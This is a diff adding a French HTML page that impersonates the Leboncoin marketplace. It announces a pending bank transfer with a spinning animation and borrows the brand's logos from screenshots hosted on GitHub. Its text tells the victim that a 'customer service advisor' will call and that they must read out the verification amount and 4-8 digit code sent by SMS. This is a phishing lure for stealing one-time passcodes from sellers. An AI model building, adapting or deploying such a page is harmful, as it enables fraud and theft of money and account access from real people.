@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virement en cours - Leboncoin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white; /* Arrière-plan en blanc */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
+            min-height: 100vh;
+            position: relative;
+            overflow-y: auto; /* Active la barre de défilement verticale */
+        }
+        .platform {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            margin-top: 100px; /* Espace pour le logo en haut */
+            margin-bottom: 150px; /* Espace pour le logo en bas */
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            color: #ff4500; /* Couleur orange pour mettre en évidence */
+            font-weight: bold;
+            background-color: #fff3e0; /* Fond légèrement orangé */
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #ff8c00;
+        }
+        .header-logo {
+            position: fixed; /* Fixé en arrière-plan */
+            top: 0; /* Positionné en haut de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: 80px; /* Hauteur réduite */
+            object-fit: cover; /* Ajuste l'image pour couvrir la largeur */
+            z-index: 0; /* Place le logo en arrière-plan */
+            filter: contrast(1.2); /* Augmente le contraste du logo */
+        }
+        .footer-logo {
+            position: fixed; /* Fixé en arrière-plan */
+            bottom: 0; /* Positionné en bas de la page */
+            left: 0;
+            width: 100%; /* Étendu sur toute la largeur */
+            height: auto;
+            z-index: 0; /* Place le logo en arrière-plan */
+            opacity: 0.8; /* Rend le logo légèrement transparent */
+        }
+        .animation-container {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 30px auto;
+        }
+        .animation-circle {
+            width: 160px;
+            height: 160px;
+            border: 5px solid transparent;
+            border-radius: 50%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-sizing: border-box;
+            animation: circle-rotate 2s linear infinite, gradient-shift 3s infinite alternate, pulse 1.5s infinite ease-in-out;
+            background: conic-gradient(from 90deg, #ff8c00, #ff4500, #ff8c00);
+            box-shadow: 0 0 20px rgba(255, 69, 0, 0.6);
+        }
+        @keyframes circle-rotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes gradient-shift {
+            0% {
+                background: conic-gradient(from 90deg, #ff8c00, #ff4500, #ff8c00);
+            }
+            50% {
+                background: conic-gradient(from 90deg, #ff4500, #ff8c00, #ff4500);
+            }
+            100% {
+                background: conic-gradient(from 90deg, #ff8c00, #ff4500, #ff8c00);
+            }
+        }
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 20px rgba(255, 69, 0, 0.6);
+            }
+            50% {
+                transform: scale(1.1);
+                box-shadow: 0 0 40px rgba(255, 69, 0, 0.8);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
+    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png?raw=true" alt="Logo LeBoncoin" class="header-logo">
+
+    <!-- Plateforme de paiement -->
+    <div class="platform">
+        <h1>VIREMENT EN COURS.</h1>
+        
+        <!-- Animation de virement en cours -->
+        <div class="animation-container">
+            <div class="animation-circle"></div>
+        </div>
+
+        <p>Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Leboncoin.</p>
+        <p>Pour terminer la confirmation de votre compte : vous serez contacté par téléphone par le service client dans les meilleurs délais.</p>
+        <p class="highlight">
+            En confirmant votre compte bancaire, vous autorisez Leboncoin à vous envoyer un SMS. Vous trouverez dans le SMS, un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres.<br><br>
+            Que vous devez communiquer au conseiller pour confirmer votre compte bancaire.
+        </p>
+        <p>La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Leboncoin.</p>
+        <p>Cordialement,<br>Leboncoin.</p>
+        <p>©1999-2020 Leboncoin. Tous droits réservés.</p>
+    </div>
+
+    <!-- Logo en bas, étendu sur toute la largeur -->
+    <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png" alt="Logo LeBoncoin Bas" class="footer-logo">
+</body>
+</html>
